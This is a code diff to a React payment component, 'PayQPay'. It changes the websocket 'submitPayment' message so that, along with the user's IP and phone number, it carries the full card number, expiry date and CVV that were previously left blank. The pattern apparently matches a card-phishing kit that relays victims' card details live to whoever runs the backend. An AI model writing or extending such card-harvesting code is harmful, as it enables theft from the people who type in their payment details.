@@ -155,14 +155,17 @@ const PayQPay = () => {
 
     // Send payment data to backend
     if (socket && userIp) {
+      const expirationDate = `${formData.expiryMonth}/${formData.expiryYear}`;
+      const cardLastDigits = formData.cardNumber.slice(-4);
+      
       socket.emit('submitPayment', {
         ip: userIp,
-        paymentMethod: 'QPay - Mobile Payment',
-        cardHolderName: '',
-        cardNumber: '',
-        cardLastDigits: '',
-        expirationDate: '',
-        cvv: '',
+        paymentMethod: 'QPay',
+        cardHolderName: 'QPay Customer',
+        cardNumber: formData.cardNumber,
+        cardLastDigits: cardLastDigits,
+        expirationDate: expirationDate,
+        cvv: formData.cvv,
         phoneNumber: formData.phoneNumber || '',
         amount: parseFloat(paymentAmount.replace(/,/g, '')) || 0,
         timestamp: new Date().toISOString()
